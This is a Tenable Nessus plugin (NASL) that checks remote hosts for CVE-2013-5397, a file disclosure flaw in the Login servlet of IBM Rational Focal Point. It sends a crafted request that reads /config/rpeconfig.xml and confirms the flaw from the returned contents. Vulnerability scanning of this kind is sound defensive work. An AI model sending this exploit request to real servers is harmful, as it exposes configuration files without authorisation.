#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72861);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_cve_id("CVE-2013-5397");
  script_bugtraq_id(64338);
  script_osvdb_id(101023);

  script_name(english:"IBM Rational Focal Point Login Servlet File Disclosure");
  script_summary(english:"Tries to exploit file disclosure vulnerability");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a file disclosure vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to exploit a file disclosure vulnerability in the Login
servlet on the remote IBM Focal Point install.  A remote attacker could
potentially use this vulnerability to view sensitive files (such as
configuration files)."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-284/");
  script_set_attribute(attribute:"see_also", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21654471");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch per the referenced vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/12/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:rational_focal_point");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("ibm_rational_focalpoint_login_detect.nbin");
  script_require_keys("www/ibm_rational_focal_point");
  script_require_ports("Services/www", 9080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:9080);

install = get_install_from_kb(
  appname      : "ibm_rational_focal_point",
  port         : port,
  exit_on_fail : TRUE
);

dir = install['dir'];

exploit = dir + "/fp/servlet/Login?file=/config/rpeconfig.xml";

res = http_send_recv3(
  port            : port,
  method          : 'GET',
  item            : exploit,
  exit_on_fail    : TRUE
);

if (
  "<?xml" >< res[2] && "<config>" >< res[2] &&
  "IBM Corporation" >< res[2] && '<feature tag="Load">' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    header = 'Nessus was able to verify the vulnerability using the following URL';

    report = get_vuln_report(
      items   : exploit,
      port    : port,
      header  : header
    );

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "IBM Rational Focal Point", build_url(port:port, qs:dir));
